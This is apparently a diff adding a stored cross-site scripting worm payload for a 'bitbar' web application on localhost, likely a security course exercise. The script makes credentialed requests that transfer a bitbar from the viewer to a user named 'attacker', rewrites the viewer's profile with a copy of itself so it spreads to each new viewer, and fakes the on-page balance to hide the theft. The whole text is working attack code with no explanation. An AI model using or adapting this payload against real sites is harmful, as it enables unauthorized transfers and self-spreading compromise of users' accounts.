@@ -1,0 +1,21 @@
+<script id="evil">
+var xhr = new XMLHttpRequest();
+xhr.withCredentials=true;
+xhr.open('POST', 'http://localhost:3000/post_transfer', false);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+var param = new URLSearchParams();
+param.append("destination_username", "attacker");
+param.append("quantity", "1");
+xhr.send(param);
+
+var xhr = new XMLHttpRequest();
+xhr.withCredentials=true;
+xhr.open('POST', 'http://localhost:3000/set_profile', false);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+var element = document.getElementById("evil");
+var profile_text = element.firstChild.data;
+xhr.send("new_profile=<scr".concat("ipt id=\"evil\">").concat(profile_text).concat("</scr").concat("ipt>"));
+
+document.getElementById("bitbar_display").innerHTML = "10 bitbars";
+window.stop();
+</script>
